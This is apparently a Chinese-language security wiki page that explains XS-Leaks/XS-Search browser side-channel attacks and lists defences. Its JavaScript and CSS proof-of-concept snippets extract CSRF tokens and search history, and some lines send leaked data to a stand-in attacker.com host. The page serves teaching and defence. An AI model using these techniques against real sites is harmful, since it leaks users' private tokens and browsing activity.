---
attack_surface: [客户端利用, 侧信道]
impact: [信息泄露, 权限提升, 用户行为推断]
risk_level: 中
prerequisites:
  - JavaScript 基础
  - 浏览器同源策略深入理解
  - 侧信道攻击概念
difficulty: 高级
related_techniques:
  - xss-cross-site-scripting
  - xssi-cross-site-script-inclusion
  - dangling-markup
  - cache-poisoning
tools:
  - XS-Leaks 测试框架
  - 浏览器 DevTools
  - Burp Suite
---

# XS-Search — 跨站搜索与侧信道攻击 (XS-Leaks)

> 关联文档：[XSS](../XSS/README.md) · [XSSI](../XSSI/README.md) · [Dangling Markup](../Dangling%20Markup/README.md) · [CRLF](../CRLF/README.md)

---

# 0x01 背景与原理

## 1.1 定义

XS-Search/XS-Leaks 是一类利用**浏览器侧信道**推断跨源信息的攻击技术。攻击者无法直接读取跨源页面内容（受同源策略限制），但可通过观察**浏览器行为差异**（时间、缓存、帧数、错误等）推导出敏感信息。

**本质是**：将跨源信息泄露转化为"是/否"的二元判断问题，通过逐位探测重建完整数据。

## 1.2 攻击前提

| 条件 | 说明 |
|------|------|
| **跨源页面状态** | 目标页面根据不同用户状态产生可观察差异 |
| **侧信道可观测** | 攻击者可测量时间/大小/行为差异 |
| **用户访问攻击页面** | 受害者浏览器执行攻击者 JS |
| **目标域有状态依赖** | 页面内容/行为依赖于搜索词、用户 ID、flag 等 |

---

# 0x02 核心攻击技术

## 2.1 Frame Counting (帧计数)

**原理**：`<object>` 或 `<iframe>` 元素的 `onload` 事件触发次数取决于页面是否返回内容。

```javascript
// 检测目标页面是否返回结果 (搜索结果非空)
const frame = document.createElement('object');
frame.data = 'https://victim.com/search?q=secret';
let count = 0;

frame.onload = () => { count++; };
frame.onerror = () => { count++; };

// count 差异 → 页面是否存在/包含内容
```

## 2.2 Cache Probing (缓存探测)

**原理**：检测资源是否被浏览器缓存，推断用户是否访问过特定页面。

```javascript
// 通过加载时间差异探测缓存
async function probeCache(url) {
  const start = performance.now();
  try {
    await fetch(url, { mode: 'no-cors', cache: 'force-cache' });
  } catch(e) {}
  const end = performance.now();
  return end - start;  // 小 = 已缓存，大 = 未缓存
}
```

## 2.3 Timing Attacks (时间攻击)

**原理**：不同搜索条件下，服务器响应时间不同。攻击者通过测量跨域请求完成时间推断结果。

```javascript
// 逐字符提取搜索
async function searchLeak(prefix) {
  const start = performance.now();
  const img = new Image();
  img.src = `https://victim.com/search?q=${prefix}`;
  await new Promise(r => { img.onerror = r; img.onload = r; });
  return performance.now() - start;
}

// 盲注提取 token
let token = '';
for (const ch of '0123456789abcdef') {
  const t = await searchLeak(token + ch);
  // 时间差异最大 → 匹配字符
}
```

## 2.4 Redirect Probing (重定向探测)

**原理**：某些页面根据登录状态/权限重定向到不同 URL。

```javascript
// 通过 history.length 检测是否发生重定向
const win = window.open('https://victim.com/admin');
setTimeout(() => {
  if (win.history.length > 1) {
    // 发生了重定向 → 未登录 (重定向到 login)
  } else {
    // 无重定向 → 已登录/已授权
  }
  win.close();
}, 500);
```

## 2.5 Connection Pool Abuse (连接池滥用)

**原理**：浏览器对同一域名限制并发连接数（通常 6 个 TCP 连接）。通过占满连接池测量请求排队时间，推断目标页面加载的资源数量/大小。

```javascript
// 1. 占满连接池
for (let i = 0; i < 6; i++) {
  fetch('https://victim.com/delay', { mode: 'no-cors' });
}
// 2. 测量第 7 个请求的排队时间
const start = performance.now();
fetch('https://victim.com/probe', { mode: 'no-cors' })
  .catch(() => {})
  .finally(() => {
    const delay = performance.now() - start;
    // delay 大 → 连接池被占用 → 页面正在加载资源
  });
```

## 2.6 CSS Injection + XS-Leaks

**原理**：结合 CSS 注入，通过 `:visited` 或属性选择器 + `url()` 加载探测资源。

```css
/* CSS 注入 → 逐字符提取 */
input[name=csrf][value^="a"] { background: url(//attacker.com/?char=a); }
input[name=csrf][value^="b"] { background: url(//attacker.com/?char=b); }
/* ... */
```

---

# 0x03 XS-Leaks 攻击策略矩阵

| 攻击策略 | 可观测特征 | 攻击复杂度 | 适用场景 |
|---------|-----------|-----------|---------|
| **Cache Probing** | 资源加载时间 | 低 | 用户访问历史探测 |
| **Frame Counting** | onload 触发次数 | 低 | 搜索结果非空检测 |
| **Timing Attack** | 响应时间差异 | 中 | 逐字符数据提取 |
| **Redirect Probing** | history.length | 低 | 登录状态/权限检测 |
| **Connection Pool** | TCP 排队延迟 | 高 | 页面资源数量探测 |
| **Error Event** | onerror 触发 | 低 | 资源存在性检测 |
| **CSS Injection Chain** | url() 回调 | 高 | 精确数据提取 |

---

# 0x04 实战攻击场景

## 4.1 用户搜索历史泄露

```javascript
// 检测用户是否搜索过 "layoff"
const probe = new Image();
const start = performance.now();
probe.src = 'https://target.com/search?q=layoff';
probe.onerror = () => {
  const elapsed = performance.now() - start;
  if (elapsed < 50) {
    // 已缓存 → 用户搜索过 "layoff"
    fetch('//attacker.com/?searched=layoff');
  }
};
```

## 4.2 CSRF Token 逐位提取

```javascript
async function extractToken() {
  const charset = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let token = '';

  for (let pos = 0; pos < 32; pos++) {
    for (const ch of charset) {
      const candidate = token + ch + '*'.repeat(32 - pos - 1);
      // 注入 CSS 或使用 timing 检测前缀匹配
      if (await testPrefix(candidate)) {
        token += ch;
        break;
      }
    }
  }
  return token;
}
```

## 4.3 用户身份推断

```javascript
// 根据用户 ID 的访问模式推断身份
async function probeUserId(uid) {
  const res = await fetch(`https://target.com/profile/${uid}`, {
    mode: 'no-cors',
    credentials: 'include'
  });
  // 通过 Side-Channel 判断 profile 是否存在
  // 200 vs 404 可能导致不同资源加载模式
}
```

---

# 0x05 防御措施

| 防御层级 | 措施 |
|---------|------|
| **Fetch Metadata** | `Sec-Fetch-Site`, `Sec-Fetch-Mode`, `Sec-Fetch-Dest` 头部检测跨站请求 |
| **SameSite Cookie** | `SameSite=Strict` 防止跨站请求带 Cookie |
| **COOP** | `Cross-Origin-Opener-Policy: same-origin` 防止 window 引用 |
| **COEP** | `Cross-Origin-Embedder-Policy: require-corp` 控制资源加载 |
| **CORP** | `Cross-Origin-Resource-Policy: same-origin` 阻止跨源资源读取 |
| **CSRF Token** | 要求状态变更请求携带不可预测 Token |
| **Isolation** | 敏感操作使用独立源 (sandbox domain) |
| **Frame Protection** | `X-Frame-Options: DENY` + `frame-ancestors 'none'` |

## 防御优先级

1. **SameSite=Strict** — 阻断最常用的 Cookie 携带
2. **Fetch Metadata** — 服务器主动拒绝可疑跨站请求
3. **COOP + COEP** — 隔离跨源资源访问通道
4. **CORP** — 标记敏感资源不可跨源加载

---

# 0x06 工具与参考

## 6.1 工具

| 工具 | 用途 |
|------|------|
| **XS-Leaks Wiki** | 全面 XS-Leaks 技术库 |
| **xsinator.com** | XS-Leaks 在线测试平台 |
| **Browser DevTools** | Performance/Network 分析 |

## 6.2 参考资源

- [XS-Leaks Wiki](https://xsleaks.dev/)
- [PortSwigger — XS-Leaks](https://portswigger.net/web-security/cross-site-leaks)
- [OWASP — XS-Leaks](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/14-Testing_for_Cross_Site_Leaks)
- [Fetch Metadata Request Headers](https://www.w3.org/TR/fetch-metadata/)
- [XSinator — Automated XS-Leak Detection](https://xsinator.com/)
